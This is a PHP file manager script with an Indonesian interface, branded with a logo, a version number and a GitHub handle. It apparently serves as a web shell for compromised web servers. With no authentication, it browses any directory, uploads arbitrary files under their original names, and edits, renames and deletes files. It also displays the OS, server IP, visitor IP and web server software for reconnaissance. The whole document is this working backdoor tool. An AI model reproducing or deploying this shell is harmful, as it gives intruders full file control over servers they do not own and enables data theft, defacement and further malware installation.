<?php
error_reporting(0);
session_start();

$dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$files = scandir($dir);

// Pisahkan folder dan file
$folders = [];
$filesOnly = [];

foreach ($files as $file) {
    if ($file == '.') continue;
    if (is_dir("$dir/$file")) {
        $folders[] = $file;
    } else {
        $filesOnly[] = $file;
    }
}

$files = array_merge($folders, $filesOnly);

// Hapus File
if (isset($_GET['delete'])) {
    unlink("$dir/" . basename($_GET['delete']));
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Hapus Banyak File
if (isset($_POST['delete_selected'])) {
    foreach ($_POST['selected_files'] as $file) {
        unlink("$dir/" . basename($file));
    }
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Rename File
if (isset($_GET['rename_old']) && isset($_GET['rename_new'])) {
    $oldName = basename($_GET['rename_old']);
    $newName = basename($_GET['rename_new']);
    rename("$dir/$oldName", "$dir/$newName");
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Upload File
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], "$dir/" . $_FILES['file']['name']);
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

// Edit File
if (isset($_GET['edit'])) {
    $fileToEdit = "$dir/" . basename($_GET['edit']);
    if (file_exists($fileToEdit) && is_file($fileToEdit)) {
        $content = htmlspecialchars(file_get_contents($fileToEdit));
        echo "<html><head><title>Edit File</title>
        <style>
        body { background: #121212; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 10px; }
        textarea { width: 100%; height: 400px; background: #222; color: white; border: 1px solid #444; padding: 5px; border-radius: 5px; }
        button { background: #0af; color: white; padding: 5px 10px; border: none; cursor: pointer; border-radius: 5px; }
        button:hover { background: #08f; }
        </style>
        </head><body>
        <h2>Edit File: " . basename($_GET['edit']) . "</h2>
        <form method='POST'>
            <textarea name='new_content'>$content</textarea><br>
            <button type='submit' name='save_file'>Save</button>
            <a href='?dir=" . urlencode($dir) . "'><button type='button'>Cancel</button></a>
        </form>
        </body></html>";
        exit;
    }
}

// Simpan File Editan
if (isset($_POST['save_file']) && isset($_GET['edit'])) {
    $fileToSave = "$dir/" . basename($_GET['edit']);
    file_put_contents($fileToSave, $_POST['new_content']);
    header("Location: ?dir=" . urlencode($dir));
    exit;
}

echo "<html><head><title>File Manager</title>
<style>
body { background: #121212; color: #fff; font-family: Arial, sans-serif; margin: 0; padding: 10px; }
h { text-align: center; }
.container { max-width: 800px; margin: auto; }
table { width: 100%; border-collapse: collapse; margin-top: 10px; }
th, td { border: 1px solid #444; padding: 8px; text-align: left; }
th { background: #222; }
a { color: #0af; text-decoration: none; }
button { background: #0af; color: white; padding: 5px 10px; border: none; cursor: pointer; border-radius: 5px; }
button:hover { background: #08f; }
input, textarea { background: #222; color: white; border: 1px solid #444; padding: 5px; width: 100%; border-radius: 5px; }
.checkbox { width: 18px; height: 18px; vertical-align: middle; cursor: pointer; }
.upload-container { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
.custom-file-input { display: none; }
.custom-file-label { background: #0af; color: white; padding: 5px 15px; border-radius: 5px; cursor: pointer; display: inline-block; }
.custom-file-label:hover { background: #08f; }
</style>
<script src='https://cdn.jsdelivr.net/npm/sweetalert2@11'></script>
<script>
function renameFile(fileName) {
    Swal.fire({
        title: 'Rename File',
        input: 'text',
        inputLabel: 'Masukkan nama baru',
        inputValue: fileName.split('/').pop(),
        showCancelButton: true,
        confirmButtonText: 'Rename',
        preConfirm: (newName) => {
            if (!newName) {
                Swal.showValidationMessage('Nama baru tidak boleh kosong');
            }
            return newName;
        }
    }).then((result) => {
        if (result.isConfirmed) {
            window.location.href = '?dir=' + encodeURIComponent(\"$dir\") +
                                   '&rename_old=' + encodeURIComponent(fileName.split('/').pop()) +
                                   '&rename_new=' + encodeURIComponent(result.value);
        }
    });
}

function confirmDelete(fileName, dir) {
    Swal.fire({
        title: 'Hapus File?',
        text: 'File akan dihapus secara permanen!',
        icon: 'warning',
        background: '#222',
        color: '#fff',
        showCancelButton: true,
        confirmButtonText: 'Hapus',
        cancelButtonText: 'Batal'
    }).then((result) => {
        if (result.isConfirmed) {
            window.location.href = '?delete=' + encodeURIComponent(fileName) + '&dir=' + encodeURIComponent(dir);
        }
    });
}

function updateFileName(input) {
    let fileName = input.files.length ? input.files[0].name : 'Tidak ada file dipilih';
    document.getElementById('file-name').textContent = fileName;
}
</script>
</head><body>";
echo "<div class='container' style='max-width: 400px; margin-left: 10px;'>";
echo "<p style='display: flex; align-items: center; gap: 10px;'>
        <img src='https://e.top4top.io/p_3371oyifj0.jpg' style='height: 99px;'>
        <span style='font-size: 20px; font-weight: bold;'>Version: 1.0</span>
      </p>";

echo "<p><b>Safe Mode:</b> " . (ini_get('safe_mode') ? "On" : "Off") . "</p>";
echo "<p><b>OS:</b> " . php_uname() . "</p>";
echo "<p><b>Server IP:</b> " . $_SERVER['SERVER_ADDR'] . "</p>";
echo "<p><b>Your IP:</b> " . $_SERVER['REMOTE_ADDR'] . "</p>";
echo "<p><b>Web Server:</b> " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
echo "<p><b>GitHub:</b> <a href='https://github.com/tuegengs' style='color: #0af;'>tuegengs</a></p>";
echo "<p><b>Current Directory:</b> $dir</p>";
echo "</div>";


echo "<form method='POST' enctype='multipart/form-data' class='upload-container'>
    <label for='file' class='custom-file-label'>Pilih File</label>
    <input type='file' id='file' name='file' class='custom-file-input' onchange='updateFileName(this)'>
    <span id='file-name' style='color:#ccc;'>Tidak ada file dipilih</span>
    <button type='submit'>Upload</button>
</form>";

echo "<form method='POST' id='deleteForm'>";
echo "<table>";
echo "<tr><th>Select</th><th>Name</th><th>Actions</th></tr>";

foreach ($files as $file) {
    $path = "$dir/$file";
    $isDir = is_dir($path);
    $link = $isDir ? "<a href='?dir=" . urlencode($path) . "'>$file/</a>" : "<a href='$path'>$file</a>";

    echo "<tr>
        <td><input type='checkbox' class='checkbox' name='selected_files[]' value='" . htmlspecialchars($file, ENT_QUOTES, 'UTF-8') . "'></td>
        <td>$link</td>
        <td class='action-buttons'>";
    
    if (!$isDir) {
        echo "<button type='button' onclick='confirmDelete(\"" . urlencode($file) . "\", \"" . urlencode($dir) . "\")'>Hapus</button>
              <button type='button' onclick='renameFile(\"" . urlencode($file) . "\")'>Rename</button>
              <button type='button' onclick='window.location.href=\"?edit=" . urlencode($file) . "&dir=" . urlencode($dir) . "\"'>Edit</button>";
    }
    
    echo "</td></tr>";
}

echo "</table>";
echo "<button type='submit' name='delete_selected' style='margin-top:10px;'>Delete Selected</button>";
echo "</form>";
echo "</div></body></html>";
?>
